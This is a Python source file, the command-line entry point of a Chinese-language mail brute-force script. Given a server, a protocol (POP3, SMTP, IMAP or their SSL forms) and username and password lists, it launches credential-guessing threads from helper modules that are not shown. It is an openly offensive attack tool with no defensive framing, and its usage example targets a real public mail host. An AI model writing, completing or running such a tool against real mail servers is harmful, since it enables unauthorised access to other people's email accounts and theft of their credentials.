# -*- coding: UTF-8 -*-
import sys
import os
from lib import imapBrust, imapsBrust, pop3Brust, pop3sBurst, smtpBurst, smtpsBrust

def start():
    if len(sys.argv) < 4:
        print("\n\t      邮件暴破脚本1.2 支持协议POP3、SMTP、IMAP、POP3S、SMTPS、IMAPS协议")
        print("\n\t      新增功能：异步机制")
        print("\n\t      必须参数为:<mailaddr> <protocol type=POP3/SMTP/IMAP/POP3S/SMTPS/IMAPS> <userlist> <passwordlist> 可选参数为:<protocol port>")
        print("\n\t      暴破格式：python MailBrust.py pop.qq.com POP3 username.txt password.txt 110")
        print("\n\t      最后的端口参数取决于邮箱服务器，110为任意端口值，可以进行修改")
        sys.exit(1)
    protocolDict = {'POP3': 110, 'SMTP': 25, 'IMAP': 143, 'POP3S': 995, 'SMTPS': 465, 'IMAPS': 993}
    mailAddr = sys.argv[1]
    mailProt = sys.argv[2]
    mailPort = protocolDict[mailProt]
    if len(sys.argv) == 6:
        mailPort = int(sys.argv[5])
    try:
        userLines = open(sys.argv[3], "r").readlines()
    except(IOError):
        print("[-]错误信息:请检查文件路径\n")
    try:
        passLines = open(sys.argv[4], "r").readlines()
    except(IOError):
        print("[-]错误信息:请检查文件路径\n")
    if sys.argv[2] == "POP3":
        pop3Thread = pop3Brust.pop3Brust(mailAddr, mailPort, userLines, passLines)
        pop3Thread.start()
        pop3Thread.join()
        print("[-]提示信息:破解完毕")
    if sys.argv[2] == "POP3S":
        pop3sThread = pop3sBurst.pop3sBrust(mailAddr, mailPort, userLines, passLines)
        pop3sThread.start()
        pop3sThread.join()
        print("[-]提示信息:破解完毕")
    if sys.argv[2] == "SMTP":
        smtpThread = smtpBurst.smtpBurst(mailAddr, mailPort, userLines, passLines)
        smtpThread.start()
        smtpThread.join()
        print("[-]提示信息:破解完毕")
    if sys.argv[2] == "SMTPS":
        smtpsThread = smtpsBrust.smtpsBurst(mailAddr, mailPort, userLines, passLines)
        smtpsThread.start()
        smtpsThread.join()
        print("[-]提示信息:破解完毕")
    if sys.argv[2] == "IMAP":
        imapThread = imapBrust.imapBrust(mailAddr, mailPort, userLines, passLines)
        imapThread.start()
        imapThread.join()
        print("[-]提示信息:破解完毕")
    if sys.argv[2] == "IMAPS":
        imapsThread = imapsBrust.imapsBrust(mailAddr, mailPort, userLines, passLines)
        imapsThread.start()
        imapsThread.join()
        print("[-]提示信息:破解完毕")
if __name__ == '__main__':
    start()